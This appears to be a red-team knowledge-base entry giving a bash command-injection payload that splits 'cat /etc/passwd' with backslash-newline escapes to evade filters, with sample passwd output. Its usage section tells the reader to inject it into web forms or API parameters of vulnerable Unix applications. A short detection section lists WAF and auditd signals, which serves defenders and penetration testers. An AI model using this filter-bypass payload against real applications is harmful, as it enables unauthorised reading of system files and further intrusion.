---
type: code
language: bash
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - command-injection
  - bypass
  - payload
validated: true
---

# backslash-newline-bypass-payload-for-cat-etc-passwd

## Code

```bash
❯ cat /et\
c/pa\
sswd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[SNIP]
```

## Description

This code snippet demonstrates a command injection payload using backslash-newline to split 'cat /etc/passwd' into fragments, bypassing filters that detect complete commands. When injected into a vulnerable application, the shell interprets it as a single command, outputting the /etc/passwd file contents.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static payload; customize splits based on filter rules | N/A |

## Usage

Inject this multi-line string into a web form or API parameter that executes shell commands (e.g., via PHP's system() or similar). Use in Burp Suite Repeater to test. Ideal for red team scenarios targeting Unix-based web apps with weak input filtering.

## Detection

- WAF logs showing multi-line or escaped inputs with 'cat' fragments.
- File access monitoring (e.g., auditd) for /etc/passwd reads from web processes.
- Response analysis for unexpected user lists in HTTP outputs.

## Related

- [[procedures/Command-Injection-Filter-Bypass-with-Backslash-Newline]]
